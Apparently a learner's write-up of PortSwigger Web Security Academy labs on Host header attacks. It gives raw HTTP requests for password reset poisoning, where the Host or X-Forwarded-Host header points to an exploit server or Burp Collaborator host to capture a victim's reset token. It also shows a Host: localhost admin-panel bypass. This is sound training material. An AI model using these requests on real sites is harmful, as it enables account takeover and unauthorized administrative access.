## Lab - 1: Basic password reset poisoning

- This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.

### how forgot password works in this lab ?

- first test with own account `wiener`
- enter name at forgot password page will make a post request

```
POST /forgot-password HTTP/1.1
Host: 0a2e00ee047f2fdbc0bd31ff00010045.web-security-academy.net
...
csrf=TmWD6yKuj2ZaYbUZkL6sH3f6jom3mvU3&username=wiener
```

- Then `Please check your email for a reset password link.`
- In email box, the following link with token is received.

```
https://0a2e00ee047f2fdbc0bd31ff00010045.web-security-academy.net/forgot-password?temp-forgot-password-token=WLiNjn9NG1CUePEojyt8OtuiaCr3clzi
```

If follow the link, reset password page is received. Then POST request to change the password.

```
POST /forgot-password?temp-forgot-password-token=Hg1GwkdzYSEpDG5FDG5M3gNMULH0vGPS HTTP/1.1
Host: 0a2e00ee047f2fdbc0bd31ff00010045.web-security-academy.net
...

csrf=9FlVx2UgbGDnst1PfLnKjyNdNp2h9wPi&temp-forgot-password-token=Hg1GwkdzYSEpDG5FDG5M3gNMULH0vGPS&new-password-1=peter&new-password-2=peter
```

### How to exploit other user

- test the Host header for POST request with other Hosts

```
POST /forgot-password HTTP/1.1
Host: www.test.com
...
csrf=TmWD6yKuj2ZaYbUZkL6sH3f6jom3mvU3&username=wiener
```

- Email still received with the following link

```
https://www.test.com/forgot-password?temp-forgot-password-token=hZ2261K8u025FraGlCRDl2Gs7RRFMjd0
```

- change the Host header to exploit server and change the user name to other user

```
POST /forgot-password HTTP/1.1
Host: exploit-0a47002904c32fb3c00831f6017b006e.web-security-academy.net/
...
csrf=SOcfxkHQ6D47ls6UbKS5xRvORlFvvlfm&username=carlos
```

- Then look at the exploit server log and found a GET request with token.
- use that token to get the change password page for other user

```
https://0a2e00ee047f2fdbc0bd31ff00010045.web-security-academy.net/forgot-password?temp-forgot-password-token=<token-from-log>
```

---

## Lab - 2: Password reset poisoning via middleware

- This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.

```
POST /forgot-password HTTP/1.1
X-Forwarded-Host: l5r2vxr3alvuvijrao2ocl83puvkj9.burpcollaborator.net
Host: 0a64005403af9d9ac08f879e001900f4.web-security-academy.net
...
username=carlos
```

---

## Lab - 3: Password reset poisoning via dangling markup

> plan after XSS

---

## Lab - 4: Web cache poisoning via ambiguous requests

> plan after web cache poisoning

---

## Lab 5 : Host header authentication bypass (A)

- This lab makes an assumption about the privilege level of the user based on the HTTP Host header. To solve the lab, access the admin panel and delete Carlos's account.

- admin route can be found at `/admin`

```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
```

---
